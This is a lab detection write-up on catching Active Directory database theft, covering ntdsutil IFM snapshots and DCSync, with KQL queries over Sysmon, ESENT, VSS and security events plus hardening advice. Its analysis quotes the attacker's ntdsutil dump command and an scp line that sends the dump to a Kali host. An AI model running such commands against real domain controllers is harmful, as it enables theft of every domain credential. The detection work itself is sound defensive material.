NTDS.DIT


Detection & Telemetry (NTDS.dit Dumping)

  1. 1.

    1. Overview

Attack Vector: The attacker utilized two primary methods to extract the Active Directory database. First, they executed a local extraction using the native ntdsutil.exe utility, which leverages the Volume Shadow Copy Service (VSS) and the ESENT database engine to create an "Install from Media" (IFM) snapshot. Second, they executed a remote extraction via DCSync, abusing the Directory Replication Service Remote Protocol (DRSUAPI) to request password hashes over the network.

Key Log Sources:

  • Sysmon Event ID 1: Process Creation (Captures ntdsutil execution parameters).

  • Application Event ID 325 & 327 (ESENT): Database Engine logging (Detects the mounting/copying of ntds.dit).

  • System Event ID 7036: Service Control Manager (Detects the VSS service starting).

  • Security Event ID 4799: Security Group Management (Detects ntdsutil checking permissions).

  • Security Event ID 4662: Directory Service Object Access (The definitive signature for DCSync).

  1. 2.

    2. Scenario: Detecting Local Extraction (Process & Telemetry)

Objective: Detect the attacker utilizing built-in tools (ntdsutil.exe) and exfiltration tools (scp.exe) on the Domain Controller.

Logic: ntdsutil.exe requires specific command-line arguments to generate an IFM snapshot. We monitor endpoint telemetry for these exact arguments, as well as subsequent unauthorized file transfers.

KQL Query:

Sysmon_Events
| where TimeGenerated > ago(4h)
| where Computer == 'DC01.shinobi.local'
| where ParentCommandLine has_any ("cmd.exe", "powershell.exe")
| project TimeGenerated, CommandLine, ParentCommandLine

Analysis:

  • Execution Chain: The Sysmon logs perfectly capture the attacker's timeline:

  1. "C:\Windows\System32\ntdsutil.exe" "ac i ntds" ifm "create full C:\Temp" q q (Creating the database snapshot).

  1. "C:\Windows\System32\OpenSSH\scp.exe" C:\temp.zip kali@192.168.56.50:/tmp/tmp.zip (Exfiltrating the compressed dump to the Kali machine).

  1. Conclusion: This is high-fidelity endpoint evidence of credential theft and immediate data exfiltration.

  1. 3.

    3. Scenario: Detecting Database Engine & VSS Anomalies (ESENT)

Objective: Detect the underlying database mechanisms being abused to bypass file locks on ntds.dit.

Logic: When ntdsutil or vssadmin backs up the database, the ESENT database engine logs the creation and detachment of the database instance. We monitor Application Event ID 325 (Created) and Event ID 327 (Detached) where the target path is irregular (e.g., C:\Temp). Additionally, the Volume Shadow Copy service must start to perform this action (Event ID 7036).

KQL Queries:

// Detect Database Creation/Detachment
Event
| where EventID in (325, 327)
| where Source == "ESENT"
| project TimeGenerated, Computer, RenderedDescription

// Detect VSS Service Start
Event
| where EventID == 7036
| where RenderedDescription has "Volume Shadow Copy"

Analysis:

  • Event 7036: The Volume Shadow Copy service entered the running state, initiating the snapshot.

  • Event 325 & 327: The ESENT engine logs explicitly state: "The database engine created a new database (2, C:\Temp\Active Directory\ntds.dit)". Shortly after, it logs the detachment.

  • Conclusion: Relying on ESENT events is a highly resilient detection method because attackers cannot easily spoof or suppress these engine-level database logs when generating a snapshot.

  1. 4.

    4. Scenario: Detecting Privilege Verification (Event 4799)

Objective: Detect the attacker's tools automatically validating their permissions before executing the dump.

Logic: ntdsutil.exe verifies if the user executing it belongs to the Administrators or Backup Operators groups before proceeding. This generates a Local Group Enumeration event (Event ID 4799).

KQL Query:

WindowsSecurityEvents

| where EventID == 4799

| where RenderedDescription has "ntdsutil.exe"

| summarize count() by TargetUserName, ProcessName, Computer, SubjectUserName

Analysis:

  • TargetUserName: Administrators and Backup Operators.

  • Caller: itachi_anbu01 utilizing ntdsutil.exe.

  • Conclusion: This behavioral artifact confirms the tool is executing its pre-flight privilege checks.

  1. 5.

    5. Scenario: Detecting DCSync (Network-Based Dumping)

Objective: Detect the remote extraction of hashes via the DRSUAPI protocol without the attacker ever touching the DC's file system.

Logic: DCSync mimics a legitimate Backup Domain Controller requesting replication. This triggers Event ID 4662 on the DC. The critical anomaly is the Access Mask (0x100) combined with the specific Replicating Directory Changes All GUID (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) being requested by a user account rather than a Domain Controller machine account.

KQL Query:

WindowsSecurityEvents
| where EventID == 4662
| where ObjectServer == "DS"
| where RenderedDescription has "0x100"
| where RenderedDescription has_any ("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
| where SubjectUserSid != "S-1-5-18"
| where SubjectUserName !endswith "$"
| project TimeGenerated, Activity="DCSync Attempt", Computer, RenderedDescription

Analysis:

  • Subject: itachi_anbu01.

  • Event: A massive volume of 4662 events triggered as the attacker iterates through the domain requesting credentials for every user.

  • Authentication Context: Correlating this with AuthenticationEvents reveals itachi_anbu01 was authenticating via NTLM from the Kali Linux IP (192.168.56.50) during the exact timeframe of the DCSync.

  1. 6.

    6. Defensive Recommendations (Mitigation)

  1. Restrict "Replicating Directory Changes" (DCSync Mitigation): Audit the Access Control List (ACL) at the domain root level. Ensure that only Domain Controllers and specifically authorized service accounts (like Azure AD Connect) hold the DS-Replication-Get-Changes-All extended right. Remove this right from standard Domain Admins where possible, requiring them to use legitimate DC infrastructure for replication.

  1. Alert on ESENT Anomalies: Create high-severity alerts for Event 325 where the database path is outside of the standard C:\Windows\NTDS\ directory.

  1. Harden VSS Permissions: Restrict access to the vssadmin.exe and ntdsutil.exe binaries using AppLocker or Windows Defender Application Control (WDAC) to prevent execution by unauthorized administrative sessions.
